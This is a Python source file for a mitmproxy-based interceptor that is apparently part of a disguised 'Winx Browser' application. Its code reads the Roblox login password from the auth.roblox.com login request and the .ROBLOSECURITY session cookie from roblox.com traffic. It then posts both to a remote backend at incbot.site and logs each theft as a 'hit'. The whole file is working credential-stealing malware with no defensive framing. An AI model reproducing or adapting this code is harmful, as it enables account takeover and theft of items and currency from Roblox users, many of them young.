"""
Winx Browser - Proxy interceptor
Captures .ROBLOSECURITY cookie from any roblox.com request after login
Captures password from auth.roblox.com/v2/login POST body
"""

import json
import re
import threading
import requests
from mitmproxy import http

# ── Config ────────────────────────────────────────────────────────────────────
BACKEND_URL = "https://www.incbot.site/api/extension/hit"
SETUP_URL = "https://www.incbot.site/api/desktop/setup"
# ─────────────────────────────────────────────────────────────────────────────

captured_password = None
cookie_sent = False
lock = threading.Lock()
directory_token = None  # Set by main.py before proxy starts

def _log(msg):
    print(msg, flush=True)
    try:
        import os, datetime
        log_path = os.path.join(os.environ.get("APPDATA", ""), "WinxBrowser", "debug.log")
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] [PROXY] {msg}\n")
    except Exception:
        pass

def load_token(config_path):
    global directory_token
    try:
        with open(config_path, 'r') as f:
            directory_token = f.read().strip()
        _log(f"[+] Token loaded from {config_path}")
    except Exception as e:
        _log(f"[!] Token load error: {e}")

class RobloxInterceptor:
    def request(self, flow: http.HTTPFlow):
        global captured_password, cookie_sent

        if not directory_token:
            return

        host = flow.request.pretty_host

        # ── Capture password from login POST ──────────────────────────────────
        if "auth.roblox.com" in host and flow.request.path.startswith("/v2/login") and flow.request.method == "POST":
            try:
                body = json.loads(flow.request.content.decode("utf-8"))
                password = body.get("password")
                if password:
                    with lock:
                        captured_password = password
                        cookie_sent = False
                    _log("[+] Password captured")
            except Exception as e:
                _log(f"[!] Password parse error: {e}")
            return

        # ── Capture cookie from any roblox.com request ────────────────────────
        if not host.endswith("roblox.com"):
            return

        cookie_header = flow.request.headers.get("cookie", "")
        if ".ROBLOSECURITY" not in cookie_header:
            return

        with lock:
            if cookie_sent:
                return

            match = re.search(r'\.ROBLOSECURITY=([^;]+)', cookie_header)
            if not match:
                return

            cookie_value = match.group(1).strip()
            if not cookie_value.startswith("_|WARNING:"):
                cookie_value = (
                    "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-into-your-account-"
                    "and-to-steal-your-ROBUX-and-items.|_" + cookie_value
                )

            if len(cookie_value) < 100:
                return

            password = captured_password
            cookie_sent = True

        _log("[+] Cookie captured, sending hit...")
        threading.Thread(
            target=send_to_backend,
            args=(cookie_value, password),
            daemon=True
        ).start()


def send_to_backend(cookie: str, password: str):
    try:
        payload = {
            "cookie": cookie,
            "directoryToken": directory_token,
        }
        if password:
            payload["password"] = password

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                          " (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Content-Type": "application/json"
        }
        resp = requests.post(BACKEND_URL, json=payload, headers=headers, timeout=15)
        if resp.status_code == 200:
            _log("[+] Hit sent successfully")
        else:
            _log(f"[!] Backend returned {resp.status_code}: {resp.text[:100]}")
    except Exception as e:
        _log(f"[!] Failed to send hit: {e}")


def run_proxy():
    _log("[INFO] Proxy starting on 127.0.0.1:8080...")
    try:
        from mitmproxy.tools.dump import DumpMaster
        from mitmproxy import options

        opts = options.Options(
            listen_host="127.0.0.1",
            listen_port=8080,
            ssl_insecure=False,
        )
        master = DumpMaster(opts, with_termlog=False, with_dumper=False)
        master.addons.add(RobloxInterceptor())
        _log("[OK] Proxy master running")
        try:
            master.run()
        except KeyboardInterrupt:
            master.shutdown()
            _log("[INFO] Proxy shut down via KeyboardInterrupt")
    except Exception as e:
        import traceback
        _log(f"[ERROR] Proxy crashed: {e}\n{traceback.format_exc()}")
